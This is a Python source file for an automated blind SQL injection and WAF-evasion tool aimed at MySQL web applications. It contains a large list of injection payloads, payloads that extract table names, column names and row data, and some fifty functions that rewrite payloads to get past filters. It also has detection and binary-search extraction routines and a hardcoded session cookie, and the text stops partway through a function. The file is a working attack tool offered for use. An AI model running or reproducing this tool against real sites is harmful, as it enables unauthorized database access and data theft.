#!/usr/bin/python3

import argparse
import urllib.parse
import time
import requests
import base64
import string
import random
import re
import sys
import concurrent.futures

from colorama import Fore
from requests.exceptions import HTTPError

# Fuzz Payloads
# https://github.com/payloadbox/sql-injection-payload-list
# https://ed4m4s.blog/tools/sql-injection-payloads
fuzzGenericPayloads = [
    "'",
    "\'\'",
    "`",
    "``",
    ",",
    "\"",
    "\"\"",
    "/",
    "//",
    "\\",
    "\\\\",
    ";",
    "' or \"",
    "-- or #",
    "' OR '1",
    "' OR 1 -- -",
    "\" OR \"\" = \"",
    "\" OR 1 = 1 -- -",
    "' OR '' = '",
    "'='",
    "'LIKE'",
    "'=0--+",
    "\" OR 1=1",
    "' OR 'x'='x",
    "' AND id IS NULL; --",
    "'''''''''''''UNION SELECT '2",
    "%00",
    "/*…*/ ",
    "+",
    "||",
    "%",
    "@variable	local variable",
    "@@variable	global variable",
    "AND 1",
    "AND 0",
    "AND true",
    "AND false",
    "1-false",
    "1-true",
    "1*56",
    "-2",
    "1' ORDER BY 1--+",
    "1' ORDER BY 2--+",
    "1' ORDER BY 3--+",
    "1' ORDER BY 1,2--+",
    "1' ORDER BY 1,2,3--+",
    "1' GROUP BY 1,2,--+",
    "1' GROUP BY 1,2,3--+",
    "' GROUP BY columnnames having 1=1 --",
    "-1' UNION SELECT 1,2,3--+",
    "' UNION SELECT sum(columnname ) from tablename --",
    "-1 UNION SELECT 1 INTO @,@",
    "-1 UNION SELECT 1 INTO @,@,@",
    "1 AND (SELECT * FROM Users) = 1",	
    "' AND MID(VERSION(),1,1) = '5';",
    "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
    "/*",
    "-- -",
    ";%00",
    "`",
    "<>\"'%;)(&+",
    "|",
    "!",
    "?",
    "/",
    "//",
    "//*",
    "'",
    "' -- ",
    "1 or 1=1",
    "1;SELECT%20*",
    "1 waitfor delay '0:0:10'--",
    "'%20or%20''='",
    "'%20or%201=1",
    "')%20or%20('x'='x",
    "'%20or%20'x'='x",
    "%20or%20x=x",
    "%20'sleep%2050'",
    "%20$(sleep%2050)",
    "%21",
    "23 OR 1=1",
    "%26",
    "%27%20or%201=1",
    "%28",
    "%29",
    "%2A%28%7C%28mail%3D%2A%29%29",
    "%2A%28%7C%28objectclass%3D%2A%29%29",
    "%2A%7C",
    "||6",
    "'||'6",
    "(||6)",
    "%7C",
    "a'",
    "admin' or '",
    "' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));",
    "' and 1 in (select var from temp)--",
    "anything' OR 'x'='x",
    "\"a\"\" or 1=1--\"",
    "a' or 1=1--",
    "\"a\"\" or 3=3--\"",
    "a' or 3=3--",
    "a' or 'a' = 'a",
    "&apos;%20OR",
    "' having 1=1--",
    "hi or 1=1 --\"",
    "hi' or 1=1 --",
    "\"hi\"\") or (\"\"a\"\"=\"\"a\"",
    "hi or a=a",
    "hi' or 'a'='a",
    "hi') or ('a'='a",
    "'hi' or 'x'='x';",
    "insert",
    "like",
    "limit",
    "*(|(mail=*))",
    "*(|(objectclass=*))",
    "or",
    "' or ''='",
    " or 0=0 #\"",
    "' or 0=0 --",
    "' or 0=0 #",
    "\" or 0=0 --",
    "or 0=0 --",
    "or 0=0 #",
    "' or 1 --'",
    "' or 1/*",
    "; or '1'='1'",
    "' or '1'='1",
    "' or '1'='1'--",
    "' or 1=1",
    "' or 1=1 /*",
    "' or 1=1--",
    "' or 1=1-- ",
    "'/**/or/**/1/**/=/**/1",
    "‘ or 1=1 --",
    "\" or 1=1--",
    "or 1=1",
    "or 1=1--",
    " or 1=1 or ""=",
    "' or 1=1 or ''='",
    "' or 1 in (select @@version)--",
    "or%201=1",
    "or%201=1 --",
]

trueFalsePayloads = [
    "' AND 1=1 %23",
    "' AND 1=2 %23"
]

# Extract payloads
extractBP0 = [
    "' AND (ascii(substr((select database()), {pos}, 1))) {op} {x} #",
    "' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {row},1), {pos}, 1))) {op} {x} #",
    "' AND (ascii(substr((select column_name from information_schema.columns where table_name='{tblName}' limit {row},1), {pos}, 1))) {op} {x} #",
    "' AND (ascii(substr((select {clmName} from {tblName} limit {row},1), {pos}, 1))) {op} {x} #"
]

optimisedSQAndingPayload1 = [
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(table_name,{pos},1))),8,'0'),1,3),2,10)FROM information_schema.tables where table_schema=database() LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(column_name,{pos},1))),8,'0'),1,3),2,10)FROM information_schema.columns where table_name='{tblName}' LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID({clmName},{pos},1))),8,'0'),1,3),2,10)FROM {tblName} LIMIT {row},1) #"
]
optimisedSQAndingPayload2 = [
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(table_name,{pos},1))),8,'0'),4,3),2,10)FROM information_schema.tables where table_schema=database() LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(column_name,{pos},1))),8,'0'),4,3),2,10)FROM information_schema.columns where table_name='{tblName}' LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID({clmName},{pos},1))),8,'0'),4,3),2,10)FROM {tblName} LIMIT {row},1) #"
]
optimisedSQAndingPayload3 = [
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(table_name,{pos},1))),8,'0'),7,2),2,10)FROM information_schema.tables where table_schema=database() LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID(column_name,{pos},1))),8,'0'),7,2),2,10)FROM information_schema.columns where table_name='{tblName}' LIMIT {row},1) #",
    "0' | (SELECT CONV(MID(LPAD(BIN(ASCII(MID({clmName},{pos},1))),8,'0'),7,2),2,10)FROM {tblName} LIMIT {row},1) #"
]

# endPoints
def getURL(url, data=None):
    paramD = {}
    parsedURL = urllib.parse.urlparse(url)
    baseURL = parsedURL.scheme + "://" + parsedURL.netloc + parsedURL.path
    parameters = parsedURL.query
    if parameters:
        for param in parameters.split('&'):
            k, v = param.split('=', 1)
            paramD[k] = v
    else:
        print(Fore.RED + "No parameters provided" + Fore.RESET)
        exit()
    return baseURL, paramD

def getSpecialURL(url, data=None):
    paramD = {}
    parsedURL = urllib.parse.urlparse(url)
    baseURL = parsedURL.scheme + "://" + parsedURL.netloc + parsedURL.path
    parameters = parsedURL.query
    if parameters:
        for param in parameters.split('&'):
            k, v = param.split('=', 1)
            if '*' in v:
                specialParam = k
                paramD[k] = v.replace('*', '')
            else:
                paramD[k] = v
    else:
        print(Fore.RED + "No parameters provided" + Fore.RESET)
        exit()
    return baseURL, paramD, specialParam

# query
def sendGetQ(url, params=None, headers=None, timeout=5, allow_redirects=False):
    try:
        # If parameters are set
        if params:
            # Encode parameter values
            encParams = urllib.parse.urlencode(params, safe='/%+')
            url += '?' + encParams
        # Send the request
        r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=allow_redirects, cookies = {'PHPSESSID': '4e522bf69e6d6090cadc47788db6defa'})
        r.raise_for_status()
        result = r.text
        return r
    
    except requests.exceptions.ConnectionError as e:
        print (Fore.RED + f"[-] A connection error occurred: {e}" + Fore.RESET)
        exit()
        return None
    except requests.exceptions.Timeout as e:
        print (Fore.RED + f"[-] The request time out: {e}" + Fore.RESET)
        exit()
        return None
    except requests.exceptions.HTTPError as e:
        if r is not None and r.status_code == 500:
            return r 
    except requests.exceptions.RequestException as e:
        print (Fore.RED + f"[-] Error executing GET query: {e}" + Fore.RESET)
        exit()
        return None

# Modification Functions

# Resources:
# https://book.hacktricks.xyz/pentesting-web/sql-injection#waf-bypass (Whitespace, No commas, Generic)
# https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
# https://portswigger.net/support/sql-injection-bypassing-common-filters
# https://ieeexplore.ieee.org/abstract/document/9074217#full-text-header
# https://github.com/sqlmapproject/sqlmap/tree/master/tamper
# https://www.utf8-chartable.de/unicode-utf8-table.pl?start=65280&number=128
# https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/
# https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf

# 51 Modifications

modifyFunctions = [
    "singleQuoteBypassWithUnicodeEnc",
    "singleQuoteBypassWithNullEnc",
    "base64Encode",
    "doubleEncodeBypass",
    "urlEncodeBypass",
    "urlUnicodeEncodeBypass",
    "urlUnicodeEscapeEncodeBypass",
    "hexEncodeBypass",
    "charUnicodeEscapeBypass",
    "htmlEncodeInDecimal",
    "htmlEncodeInHex",
    "htmlEncodeInHexSpecial",
    "newLineWithHash",
    "whiteSpaceBypassWith20",
    "whiteSpaceBypassWith09",
    "whiteSpaceBypassWith0D",
    "whiteSpaceBypassWith0C",
    "whiteSpaceBypassWith0B",
    "whiteSpaceBypassWith0A",
    "whiteSpaceBypassWithA0",
    "whiteSpaceBypassWithComments",
    "whiteSpaceBypassWithMoreComments",
    "whiteSpaceBypassWithEvenMoreComments",
    "whiteSpaceBypassWithParenthesis",
    "whiteSpaceBypassWithHashRandomStringAndNewLine",
    "whiteSpaceBypassWithDashNewLine",
    "whiteSpaceBypassWithPlus",
    "noCommaBypassLimitSubstrMid",
    "genericBypassAND",
    "genericBypassANDEnc",
    "genericBypassOR",
    "genericBypassOREnc",
    "genericBypassEqLike",
    "genericBypassEqRegExp",
    "genericBypassEqRLIKE",
    "genericBypassEqNot",
    "genericBypassGT",
    "genericBypassWHERE",
    "genericBypassWithComment",
    "genericBypassKeyWords",
    "genericBypassWith0B",
    "genericBypassWithNullBytePrepend",
    "genericBypassWithNullByteAppend",
    "genericBypassWithUpperLower",
    "genericBypassCommentsBeforeParenthesis",
    "genericBypassLower",
    "genericBypassUpper",
    "genericBypassANDWithCommand",
    "genericBypassANDWithMoreCommand",
    "genericMoreSpace",
    "genericORDtoASCII"
]

# Encoding

# 1 AND '1'='1 -> 1 AND %EF%BC%871%EF%BC%87=%EF%BC%871
def singleQuoteBypassWithUnicodeEnc(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('\'', '%EF%BC%87', payload))
    return arr

# 1 AND '1'='1 -> 1 AND %00%271%00%27=%00%271
def singleQuoteBypassWithNullEnc(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('\'', '%00%27', payload))
    return arr

# 1 AND '1'='1 -> MSBBTkQgJzEnPScx
def base64Encode(payloads):
    arr = []
    for payload in payloads:
        arr.append(base64.b64encode(payload.encode('utf-8')).decode('utf-8'))
    return arr

# 1 AND '1'='1 -> %2531%2520%2541%254e%2544%2520%2527%2531%2527%253d%2527%2531
def doubleEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        enc = []
        enc.append(''.join('%' + '{:02x}'.format(byte) for byte in payload.encode('utf-8')))
        y = ''.join(enc)
        enc2 = []
        for i in y:
            enc2.append('%25' if i == '%' else i)
        arr.append(''.join(enc2))
    return arr

# 1 AND '1'='1 -> %31%20%41%4e%44%20%27%31%27%3d%27%31
def urlEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join('%' + '{:02x}'.format(byte) for byte in payload.encode('utf-8')))
    return arr

# 1 AND '1'='1 -> %u0031%u0020%u0041%u004e%u0044%u0020%u0027%u0031%u0027%u003d%u0027%u0031
def urlUnicodeEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join(['%u{:04x}'.format(ord(char)) for char in payload]))
    return arr

# \x2e\x0\x68\x70
def urlUnicodeEscapeEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join([r'\x{:02x}'.format(ord(char)) for char in payload]))
    return arr

# 2E7068703F
def hexEncodeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join('{:02x}'.format(byte) for byte in payload.encode('utf-8')))
    return arr

# SELECT FIELD FROM TABLE -> \\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045
def charUnicodeEscapeBypass(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join('\\\\u{:04x}'.format(byte) for byte in payload.encode('utf-8')))
    return arr

# ' -> &#39; (HTML encode in decimal all characters)
def htmlEncodeInDecimal(payloads):
    arr = []
    for payload in payloads:
        x = ""
        for char in payload:
            x += f"&#{ord(char)};"
        arr.append(x)
    return arr

# ' -> &#x27; (HTML encode in hexadecimal all characters)
def htmlEncodeInHex(payloads):
    arr = []
    for payload in payloads:
        x = ""
        for char in payload:
            x += f"&#{hex(ord(char))[2:]};"
        arr.append(x)
    return arr

# ' -> &#39; (HTML encode all special characters)
def htmlEncodeInHexSpecial(payloads):
    arr = []
    for payload in payloads:
        x = ""
        for char in payload:
            if char.isalnum() or char in {' ', '\t', '\n', '\r'}:
                x += char
            else:
                x += f"&#{hex(ord(char))[2:]};"
        arr.append(x)
    return arr

##########################################################################################

# White space bypass

# New Line + encoded # with digit at the end (Prepend %0A, encode #, and append 1)
# 1 AND '1'='1 # -> %0A1 AND '1'='1 %231
def newLineWithHash(payloads):
    arr = []
    for payload in payloads:
        arr.append(f"%0A{re.sub('#', '%23', payload)}1")
    return arr

# 1 AND '1'='1 -> 1%20AND%20'1'='1
def whiteSpaceBypassWith20(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%20', payload))
    return arr

# 1 AND '1'='1 -> 1%09AND%09'1'='1
def whiteSpaceBypassWith09(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%09', payload))
    return arr

# 1 AND '1'='1 -> 1%0DAND%0D'1'='1
def whiteSpaceBypassWith0D(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%0D', payload))
    return arr

# 1 AND '1'='1 -> 1%0CAND%0C'1'='1
def whiteSpaceBypassWith0C(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%0C', payload))
    return arr

# 1 AND '1'='1 -> 1%0BAND%0B'1'='1
def whiteSpaceBypassWith0B(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%0B', payload))
    return arr

# 1 AND '1'='1 -> 1%0AAND%0A'1'='1
def whiteSpaceBypassWith0A(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%0A', payload))
    return arr

# 1 AND '1'='1 -> 1%A0AND%A0'1'='1
def whiteSpaceBypassWithA0(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '%A0', payload))
    return arr

# 1 AND '1'='1 -> 1/**/AND/**/'1'='1
def whiteSpaceBypassWithComments(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '/**/', payload))
    return arr

# 1 AND '1'='1 -> 1/*comment*/AND/*comment*/'1'='1
def whiteSpaceBypassWithMoreComments(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '/*comment*/', payload))
    return arr

# SELECT id FORM users -> SELECT/**_**/id/**_**/FROM/**_**/users
def whiteSpaceBypassWithEvenMoreComments(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '/**_**/', payload))
    return arr

# 1 and 1=1 -- -> (1)and(1)=(1)--
def whiteSpaceBypassWithParenthesis(payloads):
    arr = []
    for payload in payloads:
        x = ""
        i = 0
        while i < len(payload):
            if payload[i].isdigit():
                x += "(" + payload[i] + ")"
            elif payload[i] == "=":
                x += "(=)"
            elif payload[i] == " ":
                x += ""
            else:
                x += payload[i]
            i += 1
        arr.append(x)
    return arr

# 1 AND 9227=9227 -> 1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227 (Space -> #RANDOMTEXT%0A)
def whiteSpaceBypassWithHashRandomStringAndNewLine(payloads):
    arr = []
    for payload in payloads:
        x = ''.join(random.choices(string.ascii_letters, k=10))
        arr.append(re.sub(r'\s+', '%23' + x + '%0A', payload))
    return arr

# 1 AND 9227=9227 -> 1--%0AAND--%0A9227=9227
def whiteSpaceBypassWithDashNewLine(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '--%0A', payload))
    return arr

# space -> +
def whiteSpaceBypassWithPlus(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\s+', '+', payload))
    return arr

##########################################################################################

# No commas bypass

# LIMIT 0,1 -> LIMIT 1 OFFSET 0
# SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1)
# MID(VERSION(), 1, 1) -> MID(VERSION() FROM 1 FOR 1)
def noCommaBypassLimitSubstrMid(payloads):
    arr = []
    limitPattern = r'LIMIT\s*(?:\/\*.*?\*\/|\+)?\s*(\d+)\s*(?:\/\*.*?\*\/|\+)?\s*,\s*(\d+)'
    substrPattern = r'\b(substr)\s*\(\s*([^,]+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)'
    midPattern = r'\b(MID)\s*\(\s*([^,]+)\s*,\s*(\d+)\s*,\s*(\d+)\s*\)'

    def replaceLimit(match):
        limit = int(match.group(2))
        offset = int(match.group(1))
        return f"LIMIT {limit} OFFSET {offset}"
       
    def replaceSubstr(match):
        string = match.group(2)
        start = int(match.group(3))
        length = int(match.group(4))
        return f"SUBSTR({string} FROM {start} FOR {length})"

    def replaceMid(match):
        string = match.group(2)
        start = int(match.group(3))
        length = int(match.group(4))
        return f"MID({string} FROM {start} FOR {length})"
    
    for payload in payloads:
        x = re.sub(limitPattern, replaceLimit, payload, flags=re.IGNORECASE)
        x = re.sub(substrPattern, replaceSubstr, x, flags=re.IGNORECASE)
        x = re.sub(midPattern, replaceMid, x, flags=re.IGNORECASE)
        arr.append(x)
    return arr

##########################################################################################

# Generic

# AND -> &&
def genericBypassAND(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('AND', '&&', payload.lower()))
    return arr

# AND -> %26%26
def genericBypassANDEnc(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('AND', '%26%26', payload.lower()))
    return arr

# OR -> ||
def genericBypassOR(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('OR', '||', payload.lower()))
    return arr

# OR -> %7C%7C
def genericBypassOREnc(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('OR', '%7C%7C', payload.lower()))
    return arr

# = -> LIKE
def genericBypassEqLike(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('=', ' LIKE ', payload))
    return arr

# = -> REGEXP
def genericBypassEqRegExp(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('=', ' REGEXP ', payload))
    return arr

# = -> RLIKE
def genericBypassEqRLIKE(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('=', ' RLIKE ', payload))
    return arr

# = -> not < and not >
def genericBypassEqNot(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('=', ' not < and not > ', payload))
    return arr

# > X -> not between 0 and X
def genericBypassGT(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'>\s*(\d+)', r' not between 0 and \1', payload, flags=re.IGNORECASE))
    return arr

# WHERE -> HAVING
def genericBypassWHERE(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub('WHERE', 'HAVING', payload.lower()))
    return arr

# union select -> un/**/ion se/**/lect
def genericBypassWithComment(payloads):
    arr = []
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, f'{method[:2]}/**/{method[2:]}', x)
        arr.append(x)
    return arr

# union select 1,2,3-- -> UNunionION SEselectLECT 1,2,3--
def genericBypassKeyWords(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, f'{method[:2].upper()}{method}{method[2:].upper()}', x)        
        arr.append(x)
    return arr

# union select 1,2,3-- -> uni%0Bon se%0Blect 1,2,3--
def genericBypassWith0B(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, f'{method[:2]}%0B{method[2:]}', x)        
        arr.append(x)
    return arr

# union select 1,2,3-- -> %00union select 1,2,3--
def genericBypassWithNullBytePrepend(payloads):
    arr = []
    for payload in payloads:
        arr.append(f'%00{payload}')
    return arr

# 1 AND 1=1 -> 1 AND 1=1%00
def genericBypassWithNullByteAppend(payloads):
    arr = []
    for payload in payloads:
        arr.append(f'{payload}%00')
    return arr

# select -> SeLeCt
def genericBypassWithUpperLower(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.split()
        for i, word in enumerate(x):
            for method in methods:
                if method.lower() in word.lower():
                    pattern = re.compile(re.escape(method), re.IGNORECASE)
                    x[i] = pattern.sub(lambda m: ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(m.group())]), word)
        arr.append(' '.join(x))
    return arr

# SELECT ABS(1) -> SELECT ABS/**/(1)
def genericBypassCommentsBeforeParenthesis(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'(\()', r'/**/\1', payload))
    return arr

# INSERT -> insert
def genericBypassLower(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, method.lower(), x)
        arr.append(x)
    return arr

# insert -> INSERT
def genericBypassUpper(payloads):
    methods = ["union", "select", "conv", "mid", "lpad", "bin", "ascii", "from", "and", "or", "limit", "substr", "substring", "in", "position", "if", "where"]
    arr = []
    for payload in payloads:
        x = payload.lower()
        for method in methods:
            x = re.sub(method, method.lower(), x)
        arr.append(x)
    return arr

# 1 AND 2>1-- -> 1 /*!30963AND 2>1*/--
def genericBypassANDWithCommand(payloads):
    arr = []
    pattern1 = r'\b(AND|OR)\b'
    pattern2 = r'(--|#)'

    for payload in payloads:
        x = re.sub(pattern1, r'/*!30963\1', payload, flags=re.IGNORECASE)
        x = re.sub(pattern2, r'*/\1', x)
        arr.append(x)
    return arr

# 1 AND 2>1-- -> 1 /*!00000AND 2>1*/--
def genericBypassANDWithMoreCommand(payloads):
    arr = []
    pattern1 = r'\b(AND|OR)\b'
    pattern2 = r'(--|#)'

    for payload in payloads:
        x = re.sub(pattern1, r'/*!00000\1', payload, flags=re.IGNORECASE)
        x = re.sub(pattern2, r'*/\1', x)
        arr.append(x)
    return arr

# 1 UNION SELECT foobar -> 1     UNION     SELECT     foobar
def genericMoreSpace(payloads):
    arr = []
    for payload in payloads:
        arr.append(''.join([char + ' ' * 4 if char.isspace() else char for char in payload.lower()]))
    return arr

# ORD('42') -> ASCII('42')
def genericORDtoASCII(payloads):
    arr = []
    for payload in payloads:
        arr.append(re.sub(r'\bord\b', 'ascii', payload, flags=re.IGNORECASE))
    return arr

# Identify SQL Injection Vuln
def identifyMySQLBoolean(url, params, payloads, trueFalsePayloads):
    # Add some headers. Might change to different one later.
    headers = {
        'User-Agent': 'Mozilla/5.0'
    }
    try:
        r1 = sendGetQ(url, params=params, headers=headers)
        originalValues = {k: v for k,v in params.items()}
        newParamsTrue = params.copy()
        newParamsFalse = params.copy()
        for k, v in params.items():
            newParamsTrue[k] = v + trueFalsePayloads[0]
            newParamsFalse[k] = v + trueFalsePayloads[1]
            rTrue = sendGetQ(url, params=newParamsTrue, headers=headers)
            rFalse = sendGetQ(url, params=newParamsFalse, headers=headers)
            for payload in payloads:
                params[k] = v + payload
                try:
                    # Send the request with the payload
                    r2 = sendGetQ(url, params=params, headers=headers)
                    if r2 is not None and (rTrue.text == r1.text and r1.text != rFalse.text):
                        print (Fore.GREEN + f"[+] Potential Vulnerability Found with payload: {newParamsTrue[k]} and {newParamsFalse[k]}" + Fore.RESET)
                        params[k] = originalValues[k]
                        return True, params, k
                    elif r2 is not None and r2.status_code == 500:
                        print (Fore.GREEN + f"[+] Potential Vulnerability Found with payload: {payload}")
                        params[k] = originalValues[k]
                        return True, params, k
                except HTTPError as e:
                    if e.response is not None and e.response.status_code != 500:
                        print (Fore.RED + f"[-] HTTP Error: {e}" + Fore.RESET)
            params[k] = originalValues[k]
    
    except HTTPError as e:
        print (Fore.RED + f"[-] HTTP Error: {e}" + Fore.RESET)
    return False, None, None

# Extract Binary Search algorithm (BiSection)
def boolenTF(url, params, t, f):
    r = sendGetQ(url, params=params, allow_redirects=False)
    if r.status_code == 200 and r.status_code != 500 and (t.text == r.text and r.text != f.text):
        return True
    return False
     
def prepPayload(params, vulnPoint, payloads, row, extract, pos, op, x, tblName=None, clmName=None):
    if extract == "tbls":
        injPayload = payloads.format(row=row, pos=pos, op=op, x=x)
    elif extract == "clms":
        injPayload = payloads.format(tblName=tblName, row=row, pos=pos, op=op, x=x)
    elif extract == "info":
        injPayload = payloads.format(clmName=clmName, tblName=tblName, row=row, pos=pos, op=op, x=x)
    newParams = params.copy()
    newParams[vulnPoint] += injPayload
    return newParams

def extractBooleanInfo(url, params, vulnPoint, payloads, t, f, row, extract, tblName=None, clmName=None, max_length=100):
    x = ''
    pos = 1
    op = ">"

    while True:
        found = False
        low = 32
        high = 128

        while low <= high:
            mid = low + (high - low) // 2
            print (f"Low: {low} | MID: {mid} | High: {high}")
            newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, op, mid, tblName=tblName, clmName=clmName)
            if boolenTF(url, newParams, t, f):
                low = mid + 1
            else:
                high = mid - 1

        if 32 <= mid <= 126:
            found = True
        if found:
            op = "="
            newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, op, mid, tblName=tblName, clmName=clmName)
            if boolenTF(url, newParams, t, f):
                x += chr(mid)
                sys.stdout.write(Fore.GREEN + f"\r[+] Result: {x}" + Fore.RESET)
                found = True
            else:
                newX = mid +1
                newParams = prepPayload(params, vulnPoint, payloads, row, extract, pos, op, newX, tblName=tblName, clmName=clmName)
                if boolenTF(url, newParams, t, f):
                    x += chr(newX)
                    sys.stdout.write(Fore.GREEN + f"\r[*] Result: {x}" + Fore.RESET)
                    found = True
                else:
                    found = False
                    break
        else:
            found = False
            break
        
        if not found or len(x) >= max_length or mid > 127:
            break
        pos += 1
        low = 32
        high = 128
        op = ">"
    return x

def extractTables(url, params, vulnPoint, payloads, t, f):
    row = 0
    tblNames = []
    while True:
        tempTbl = extractBooleanInfo(url, params, vulnPoint, payloads, t, f, row, extract='tbls')
        if tempTbl:
            print ()
            tblNames.append(tempTbl)
            row += 1
        else:
            break
    return tblNames

def extractColumns(url, params, vulnPoint, payloads, t, f, tblNames):
    clmNames = {}
    for tblName in tblNames:
        clmNames[tblName] = []
        row = 0
        while True:
            tempClm = extractBooleanInfo(url, params, vulnPoint, payloads, t, f, row, extract='clms', tblName=tblName)
            if tempClm:
                print ()
                clmNames[tblName].append(tempClm)
                row += 1
            else:
                break
    return clmNames
    
def extractInfo(url, params, vulnPoint, payloads, t, f, tblNames, clmNames):
    info = {}
    for tblName in tblNames:
        row = 0
        info[tblName] = []
        while True:
            tempDict = {}
            for clmName in clmNames[tblName]:
                print ()
                tempInfo = extractBooleanInfo(url, params, vulnPoint, payloads, t, f, row, extract='info', tblName=tblName, clmName=clmName)
                tempDict[clmName] = tempInfo
            if not any(tempDict.values()):
                break
            info[tblName].append(tempDict)
            row += 1
    return info              

def extractBooleanMain(url, params, vulnPoint, payloads, trueFalsePayloads, tbl=None, clm=None):
    t = params.copy()
    f = params.copy()
    t[vulnPoint] += trueFalsePayloads[0]
    f[vulnPoint] += trueFalsePayloads[1]
    rT = sendGetQ(url, params=t, allow_redirects=False)
    rF = sendGetQ(url, params=f, allow_redirects=False)
    info = {}
    tblNames = [tbl] if tbl is not None else extractTables(url, params, vulnPoint, payloads[1], rT, rF)
    clmNames = {tbl:clm} if clm is not None else extractColumns(url, params, vulnPoint, payloads[2], rT, rF, tblNames)
    info.update(extractInfo(url, params, vulnPoint, payloads[3], rT, rF, tblNames, clmNames))
    
    if tbl is None and clm is None and info:
        return True, info
    elif tblNames and clmNames and info and any(info.values()):
        return True, info
    else:
        return False, info

# Optimised SQL-ANDing extraction method
def prepPayload(params, vulnPoint, payloads, row, extract, pos, tblName=None, clmName=None):
    if extract == "tbls":
        injPayload = payloads.format(pos=pos, row=row)
    elif extract == "clms":
        injPayload = payloads.format(pos=pos, tblName=tblName, row=row)
    elif extract == "info":
        injPayload = payloads.format(clmName=clmName, pos=pos, tblName=tblName, row=row)
    newParams = params.copy()
    newParams[vulnPoint] = injPayload
    return newParams

def extractBooleanInfo(url, params, vulnPoint, payload1, payload2, payload3, t0, t1, t2, t3, t4, t5, t6, t7, row, extract, tblName=None, clmName=None, max_length=100):
    x = ''
    pos = 1

    def getCharacters(payload, t0, t1, t2, t3, t4, t5, t6, t7):
        temp = ''
        newParams = prepPayload(params, vulnPoint, payload, row, extract, pos, tblName=tblName, clmName=clmName)
        r = sendGetQ(url, params=newParams, allow_redirects=False)
        zV = 2 if payload == payload3 else 3
        if r.text == t0.text:
            temp += bin(0)[2:].zfill(zV)
        elif r.text == t1.text:
